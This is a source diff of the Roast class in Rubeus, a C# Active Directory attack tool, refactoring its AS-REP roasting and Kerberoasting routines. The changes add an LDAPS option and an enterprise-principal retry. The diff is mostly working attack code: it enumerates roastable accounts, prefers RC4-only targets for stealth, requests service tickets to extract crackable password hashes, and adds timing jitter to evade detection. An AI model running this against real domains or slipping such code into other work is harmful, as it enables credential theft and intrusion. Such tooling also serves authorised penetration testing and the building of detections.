@@ -13,7 +13,7 @@ namespace Rubeus
 {
     public class Roast
     {
-        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "")
+        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false)
         {
             if (!String.IsNullOrEmpty(userName))
             {
@@ -41,113 +41,45 @@ namespace Rubeus
             }
             else
             {
-                DirectoryEntry directoryObject = null;
-                DirectorySearcher userSearcher = null;
+                string userSearchFilter = "";
 
-                try
+                if (String.IsNullOrEmpty(userName))
                 {
-                    if (String.IsNullOrEmpty(domainController))
-                    {
-                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
-                    }
-                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, domainController, domain);
-                    userSearcher = new DirectorySearcher(directoryObject);
-                    // enable LDAP paged search to get all results, by pages of 1000 items
-                    userSearcher.PageSize = 1000;
+                    userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                 }
-                catch (Exception ex)
+                else
                 {
-                    if (ex.InnerException != null)
-                    {
-                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
-                    }
+                    userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
+                }
+                if (!String.IsNullOrEmpty(ldapFilter))
+                {
+                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
+                }
+                
+                if (String.IsNullOrEmpty(domain))
+                {
+                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
+                }
+                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);
+
+                if (users == null)
+                {
+                    Console.WriteLine("[X] Error during executing the LDAP query.");
                     return;
                 }
-
-                // check to ensure that the bind worked correctly
-                try
+                if (users.Count == 0)
                 {
-                    string dirPath = directoryObject.Path;
-                    if (String.IsNullOrEmpty(dirPath))
-                    {
-                        Console.WriteLine("[*] Searching the current domain for AS-REP roastable users");
-                    }
-                    else
-                    {
-                        Console.WriteLine("[*] Searching path '{0}' for AS-REP roastable users", dirPath);
-                    }
-                }
-                catch (DirectoryServicesCOMException ex)
-                {
-                    if (!String.IsNullOrEmpty(OUName))
-                    {
-                        Console.WriteLine("\r\n[X] Error validating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error validating the domain searcher: {0}", ex.Message);
-                    }
-                    return;
+                    Console.WriteLine("[X] No users found to AS-REP roast!");
                 }
 
-                try
+                foreach (IDictionary<string, Object> user in users)
                 {
-                    string userSearchFilter = "";
+                    string samAccountName = (string)user["samaccountname"];
+                    string distinguishedName = (string)user["distinguishedname"];
+                    Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
+                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
 
-                    if (String.IsNullOrEmpty(userName))
-                    {
-                        userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
-                    }
-                    else
-                    {
-                        userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
-                    }
-                    if (!String.IsNullOrEmpty(ldapFilter))
-                    {
-                        userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
-                    }
-                    userSearcher.Filter = userSearchFilter;
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
-                    return;
-                }
-
-                try
-                {
-                    SearchResultCollection users = userSearcher.FindAll();
-
-                    if (users.Count == 0)
-                    {
-                        Console.WriteLine("[X] No users found to AS-REP roast!");
-                    }
-
-                    foreach (SearchResult user in users)
-                    {
-                        string samAccountName = user.Properties["samAccountName"][0].ToString();
-                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
-                        Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
-                        Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
-
-                        GetASRepHash(samAccountName, domain, domainController, format, outFile);
-                    }
-                }
-                catch (Exception ex)
-                {
-                    if (ex.InnerException != null)
-                    {
-                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
-                    }
-                    return;
+                    GetASRepHash(samAccountName, domain, domainController, format, outFile);
                 }
             }
 
@@ -249,7 +181,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false)
         {
             if (userStats)
             {
@@ -393,162 +325,103 @@ namespace Rubeus
                     LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
-                DirectoryEntry directoryObject = null;
-                DirectorySearcher userSearcher = null;
+                // build LDAP query
+                string userFilter = "";
 
-                try
+                if (!String.IsNullOrEmpty(userName))
                 {
-                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, dc, domain);
-                    userSearcher = new DirectorySearcher(directoryObject);
-                    // enable LDAP paged search to get all results, by pages of 1000 items
-                    userSearcher.PageSize = 1000;
-                }
-                catch (Exception ex)
-                {
-                    if (ex.InnerException != null)
+                    if (userName.Contains(","))
                     {
-                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                        // searching for multiple specified users, ensuring they're not disabled accounts
+                        string userPart = "";
+                        foreach (string user in userName.Split(','))
+                        {
+                            userPart += String.Format("(samAccountName={0})", user);
+                        }
+                        userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
                     }
                     else
                     {
-                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
-                    }
-                    return;
-                }
-
-                // check to ensure that the bind worked correctly
-                try
-                {
-                    string dirPath = directoryObject.Path;
-                    if (String.IsNullOrEmpty(dirPath))
-                    {
-                        Console.WriteLine("[*] Searching the current domain for Kerberoastable users");
-                    }
-                    else
-                    {
-                        Console.WriteLine("[*] Searching path '{0}' for Kerberoastable users", dirPath);
+                        // searching for a specified user, ensuring it's not a disabled account
+                        userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
                     }
                 }
-                catch (DirectoryServicesCOMException ex)
+                else
                 {
-                    if (!String.IsNullOrEmpty(OUName))
-                    {
-                        Console.WriteLine("\r\n[X] Error validating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
-                    }
-                    else
-                    {
-                        Console.WriteLine("\r\n[X] Error validating the domain searcher: {0}", ex.Message);
-                    }
-                    return;
+                    // if no user specified, filter out the krbtgt account and disabled accounts
+                    userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
                 }
 
-                try
+                string encFilter = "";
+                if (String.Equals(supportedEType, "rc4opsec"))
                 {
-                    string userFilter = "";
-
-                    if (!String.IsNullOrEmpty(userName))
-                    {
-                        if (userName.Contains(","))
-                        {
-                            // searching for multiple specified users, ensuring they're not disabled accounts
-                            string userPart = "";
-                            foreach (string user in userName.Split(','))
-                            {
-                                userPart += String.Format("(samAccountName={0})", user);
-                            }
-                            userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
-                        }
-                        else
-                        {
-                            // searching for a specified user, ensuring it's not a disabled account
-                            userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
-                        }
-                    }
-                    else
-                    {
-                        // if no user specified, filter out the krbtgt account and disabled accounts
-                        userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
-                    }
-
-                    string encFilter = "";
-                    if (String.Equals(supportedEType, "rc4opsec"))
-                    {
-                        // "opsec" RC4, meaning don't RC4 roast accounts that support AES
-                        Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
-                        encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
-                    }
-                    else if (String.Equals(supportedEType, "aes"))
-                    {
-                        // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
-                        Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
-                        encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
-                    }
-
-                    // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
-                    //       then RC4 tickets would NOT be returned, so the original filter was:
-                    //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
-                    //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
-                    //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
-                    //  userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";
-
-                    //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
-                    //      so this fine-grained filtering is not needed
-
-                    string userSearchFilter = "";
-                    if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
-                    {
-                        if (String.IsNullOrEmpty(pwdSetAfter))
-                        {
-                            pwdSetAfter = "01-01-1601";
-                        }
-                        if (String.IsNullOrEmpty(pwdSetBefore))
-                        {
-                            pwdSetBefore = "01-01-2100";
-                        }
-
-                        Console.WriteLine("[*] Searching for accounts with lastpwdset from {0} to {1}", pwdSetAfter, pwdSetBefore);
-
-                        try
-                        {
-                            DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
-                            DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
-                            string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
-                            userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
-                        }
-                        catch
-                        {
-                            Console.WriteLine("\r\n[X] Error parsing /pwdsetbefore or /pwdsetafter, please use the format 'MM-dd-yyyy'");
-                            return;
-                        }
-                    }
-                    else
-                    {
-                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
-                    }
-
-                    if (!String.IsNullOrEmpty(ldapFilter))
-                    {
-                        userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
-                    }
-
-                    userSearcher.Filter = userSearchFilter;
+                    // "opsec" RC4, meaning don't RC4 roast accounts that support AES
+                    Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
+                    encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                 }
-                catch (Exception ex)
+                else if (String.Equals(supportedEType, "aes"))
                 {
-                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
+                    // msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24 ->  supported etypes includes AES128/256
+                    Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
+                    encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
+                }
+
+                // Note: I originally thought that if enctypes included AES but DIDN'T include RC4, 
+                //       then RC4 tickets would NOT be returned, so the original filter was:
+                //  !msds-supportedencryptiontypes=*                        ->  null supported etypes, so RC4
+                //  msds-supportedencryptiontypes=0                         ->  no supported etypes specified, so RC4
+                //  msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4 ->  supported etypes includes RC4
+                //  userSearcher.Filter = "(&(samAccountType=805306368)(serviceprincipalname=*)(!samAccountName=krbtgt)(|(!msds-supportedencryptiontypes=*)(msds-supportedencryptiontypes=0)(msds-supportedencryptiontypes:1.2.840.113556.1.4.803:=4)))";
+
+                //  But apparently Microsoft is silly and doesn't really follow their own docs and RC4 is always returned regardless ¯\_(ツ)_/¯
+                //      so this fine-grained filtering is not needed
+
+                string userSearchFilter = "";
+                if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
+                {
+                    if (String.IsNullOrEmpty(pwdSetAfter))
+                    {
+                        pwdSetAfter = "01-01-1601";
+                    }
+                    if (String.IsNullOrEmpty(pwdSetBefore))
+                    {
+                        pwdSetBefore = "01-01-2100";
+                    }
+
+                    Console.WriteLine("[*] Searching for accounts with lastpwdset from {0} to {1}", pwdSetAfter, pwdSetBefore);
+
+                    try
+                    {
+                        DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
+                        DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
+                        string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
+                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("\r\n[X] Error parsing /pwdsetbefore or /pwdsetafter, please use the format 'MM-dd-yyyy'");
+                        return;
+                    }
+                }
+                else
+                {
+                    userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
+                }
+
+                if (!String.IsNullOrEmpty(ldapFilter))
+                {
+                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
+                }
+
+                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, dc, domain, userSearchFilter, ldaps);
+                if (users == null)
+                {
+                    Console.WriteLine("[X] LDAP query failed, try specifying more domain information or specific SPNs.");
                     return;
                 }
 
                 try
                 {
-                    if (resultLimit > 0)
-                    {
-                        userSearcher.SizeLimit = resultLimit;
-                        Console.WriteLine("[*] Up to {0} result(s) will be returned", resultLimit.ToString());
-                    }
-
-                    SearchResultCollection users = userSearcher.FindAll();
-
                     if (users.Count == 0)
                     {
                         Console.WriteLine("\r\n[X] No users found to Kerberoast!");
@@ -563,24 +436,23 @@ namespace Rubeus
                     // used to keep track of years that users had passwords last set in
                     SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();
 
-                    foreach (SearchResult user in users)
+                    foreach (IDictionary<string, Object> user in users)
                     {
-                        string samAccountName = user.Properties["samAccountName"][0].ToString();
-                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
-                        string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
+                        string samAccountName = (string)user["samaccountname"];
+                        string distinguishedName = (string)user["distinguishedname"];
+                        string servicePrincipalName = ((string[])user["serviceprincipalname"])[0];
 
 
                         DateTime? pwdLastSet = null;
-                        if (user.Properties.Contains("pwdlastset"))
+                        if (user.ContainsKey("pwdlastset"))
                         {
-                            long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
-                            pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
+                            pwdLastSet = ((DateTime)user["pwdlastset"]).ToLocalTime();
                         }
 
                         Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
-                        if (user.Properties.Contains("msDS-SupportedEncryptionTypes"))
+                        if (user.ContainsKey("msds-supportedencryptiontypes"))
                         {
-                            supportedETypes = (Interop.SUPPORTED_ETYPE)user.Properties["msDS-SupportedEncryptionTypes"][0];
+                            supportedETypes = (Interop.SUPPORTED_ETYPE)(int)user["msds-supportedencryptiontypes"];
                         }
 
                         if (!userETypes.ContainsKey(supportedETypes))
@@ -665,8 +537,15 @@ namespace Rubeus
                             else
                             {
                                 // otherwise use the KerberosRequestorSecurityToken method
-                                GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
+                                bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                 Helpers.RandomDelayWithJitter(delay, jitter);
+                                if (!result && autoenterprise)
+                                {
+                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
+                                    Helpers.RandomDelayWithJitter(delay, jitter);
+                                }
                             }
                         }
                     }
@@ -704,7 +583,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
+        public static bool GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
         {
             // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach
 
@@ -736,7 +615,7 @@ namespace Rubeus
                 if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                 {
                     Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
-                    return;
+                    return false;
                 }
 
                 // ignore the GSSAPI frame
@@ -837,7 +716,9 @@ namespace Rubeus
             catch (Exception ex)
             {
                 Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
+                return false;
             }
+            return true;
         }
 
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
